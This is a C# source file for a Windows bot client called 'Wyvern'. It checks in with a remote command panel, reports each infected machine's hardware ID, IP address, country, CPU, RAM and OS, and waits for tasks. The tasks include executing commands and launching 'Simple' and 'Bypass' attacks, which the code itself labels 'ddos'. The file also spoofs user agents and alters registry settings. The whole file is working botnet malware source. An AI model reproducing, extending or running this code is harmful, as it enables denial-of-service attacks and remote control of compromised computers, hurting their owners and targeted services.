using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Wyvern
{
    class Program
    {
        static void Main()
        {
            bool createdNew;
            Mutex mutex = new Mutex(true, Config.panelAddress, out createdNew);
            if (!createdNew)
            {
                Environment.Exit(0);
            }
            ImHere();
        }

        [DllImport("wininet.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern bool InternetSetOption(IntPtr hInternet, int dwOption, IntPtr lpBuffer, int dwBufferLength);
        [DllImport("urlmon.dll", CharSet = CharSet.Ansi)]
        private static extern int UrlMkSetSessionOption(int dwOption, string pBuffer, int dwBufferLength, int dwReserved);

        const int URLMON_OPTION_USERAGENT = 0x10000001;
        const int URLMON_OPTION_USERAGENT_REFRESH = 0x10000002;

        static void IEVersion()
        {
            try
            {
                WebBrowser webBrowser = new WebBrowser();
                int major = webBrowser.Version.Major;
                int num;
                if (major >= 11)
                {
                    num = 11001;
                }
                else if (major != 10)
                {
                    if (major != 9)
                    {
                        if (major == 8)
                        {
                            num = 8888;
                        }
                        else
                        {
                            num = 7000;
                        }
                    }
                    else
                    {
                        num = 9999;
                    }
                }
                else
                {
                    num = 10001;
                }
                RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Internet Explorer\\Main\\FeatureControl\\FEATURE_BROWSER_EMULATION", RegistryKeyPermissionCheck.ReadWriteSubTree);
                registryKey.SetValue(Process.GetCurrentProcess().ProcessName + ".exe", num, RegistryValueKind.DWord);
                webBrowser.Dispose();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }

        static void ImHere()
        {
            Thread t = new Thread(IEVersion);
            t.SetApartmentState(ApartmentState.STA);
            t.Start();
            t.Join();

            var thisProcess = Process.GetCurrentProcess();
            thisProcess.PriorityClass = ProcessPriorityClass.High;
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)48 | (SecurityProtocolType)192 | (SecurityProtocolType)768 | (SecurityProtocolType)3072;
            ServicePointManager.Expect100Continue = false;

            var ptr = Marshal.AllocHGlobal(4);
            Marshal.WriteInt32(ptr, 3);
            InternetSetOption(IntPtr.Zero, 81, ptr, 4);
            Marshal.Release(ptr);

            Variable.GenerateUserAgent();
            UrlMkSetSessionOption(URLMON_OPTION_USERAGENT_REFRESH, null, 0, 0);
            UrlMkSetSessionOption(URLMON_OPTION_USERAGENT, Variable.BypassUserAgent, Variable.BypassUserAgent.Length, 0);
            var interval = GetInterval() * 60 * 1000;
            if (interval < 60000)
            {
                interval = 60000;
            }
            while (true)
            {
                try
                {
                getResponse:
                    var tasks = GetResponse();
                    if (tasks == null)
                    {
                        Thread.Sleep(interval);
                        goto getResponse;
                    }
                    foreach (var task in tasks)
                    {
                        if (task.Equals(string.Empty))
                            break;
                        Console.WriteLine(task);
                        var taskType = task.Split(new string[] { "|:|" }, StringSplitOptions.None)[0];
                        var taskParams = task.Split(new string[] { "|:|" }, StringSplitOptions.None)[1].Split('|');
                        switch (taskType)
                        {
                            case "exec":
                                new Thread(() => Exec(taskParams)).Start();
                                break;
                            case "Simple":
                                var t1 = new Thread(() => Simple(taskParams));
                                t.SetApartmentState(ApartmentState.STA);
                                t.Start();
                                break;
                            case "Bypass":
                                var t2 = new Thread(() => Bypass(taskParams));
                                t2.SetApartmentState(ApartmentState.STA);
                                t2.Start();
                                break;
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex);
                }
                Thread.Sleep(interval);
            }
        }

        static void Bypass(string[] param)
        {
            var ddos = new Attack("Bypass", param[0], Convert.ToInt32(param[1]), Convert.ToInt32(param[2]), Convert.ToInt32(param[3]), Convert.ToInt32(param[4]), param[5], Convert.ToBoolean(param[6]), Convert.ToBoolean(param[7]), Convert.ToInt32(param[8]), Convert.ToInt32(param[9]));
            ddos.Start();
            ddos.Dispose();
        }

        static void Simple(string[] param)
        {
            var ddos = new Attack("Simple", param[0], Convert.ToInt32(param[1]), Convert.ToInt32(param[2]), Convert.ToInt32(param[3]), Convert.ToInt32(param[4]), param[5], Convert.ToBoolean(param[6]), Convert.ToBoolean(param[7]), Convert.ToInt32(param[8]), Convert.ToInt32(param[9]));
            ddos.Start();
            ddos.Dispose();
        }

        static void Exec(string[] param)
        {
            try
            {
                var task = new Task(param[0]);
                task.Exec();
                task.Dispose();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }

        static int GetInterval()
        {
            try
            {
                var webClient = new WebClient();
                var intervalString = webClient.DownloadString(Config.panelAddress + "/interval");
                var result = Convert.ToInt32(intervalString);
                return result;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
                return -1;
            }
        }

        static string[] GetResponse()
        {
            try
            {
                var postData = string.Format("hwid={0}&ip={1}&cn={2}&cpu={3}&ram={4}&os={5}", GetHWID(), GetIP(), GetCountry(), GetCPU(), GetRam(), GetOS());
                var sendData = UTF8Encoding.UTF8.GetBytes(postData);
                var httpWebRequest = (HttpWebRequest)WebRequest.Create(Config.panelAddress + "/docking");
                httpWebRequest.Method = "POST";
                httpWebRequest.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
                httpWebRequest.UserAgent = Config.userAgent;
                httpWebRequest.ContentLength = sendData.Length;
                var requestStream = httpWebRequest.GetRequestStream();
                requestStream.Write(sendData, 0, sendData.Length);
                requestStream.Close();
                var httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
                var streamReader = new StreamReader(httpWebResponse.GetResponseStream(), Encoding.GetEncoding("UTF-8"));
                var result = streamReader.ReadToEnd();
                streamReader.Close();
                httpWebResponse.Close();
                if (result.Equals(string.Empty))
                {
                    return null;
                }
                return result.Split(new string[] { "&||&" }, StringSplitOptions.None);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
                return null;
            }
        }

        static string GetHWID()
        {
            return Fingerprint.Value();
        }

        static string GetIP()
        {
            var webClient = new WebClient();
            var jsonString = webClient.DownloadString("https://api.myip.com");
            var ip = jsonString.Trim('{').Trim('}').Split(',')[0].Split(':')[1].Trim('"');
            return ip;
        }

        static string GetCountry()
        {
            var webClient = new WebClient();
            var jsonString = webClient.DownloadString("https://api.myip.com");
            var country = jsonString.Trim('{').Trim('}').Split(',')[1].Split(':')[1].Trim('"');
            return country;
        }

        static string GetCPU()
        {
            var mbs = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
            var mbsList = mbs.Get();
            var cpu = "unknown";
            foreach (var mo in mbsList)
            {
                cpu = mo["Name"].ToString();
                break;
            }
            return cpu;
        }

        static string GetRam()
        {
            var mbs = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem");
            var mbsList = mbs.Get();
            var ram = "unknown";
            foreach (var mo in mbsList)
            {
                var res = Convert.ToDouble(mo["TotalVisibleMemorySize"]);
                var fres = Math.Round((res / (1024 * 1024)), 2);
                ram = fres + " GB";
            }
            return ram;
        }

        static string GetOS()
        {
            var version = Environment.OSVersion.Version.Major.ToString() + "." + Environment.OSVersion.Version.Minor.ToString();
            switch (version)
            {
                case "10.0": return "Windows 10";
                case "6.3": return "Windows 8.1";
                case "6.2": return "Windows 8";
                case "6.1": return "Windows 7";
                case "6.0": return "Windows Vista";
                case "5.2": return "Windows XP 64-Bit Edition";
                case "5.1": return "Windows XP";
                case "5.0": return "Windows 2000";
            }
            return "unknown";
        }
    }
}
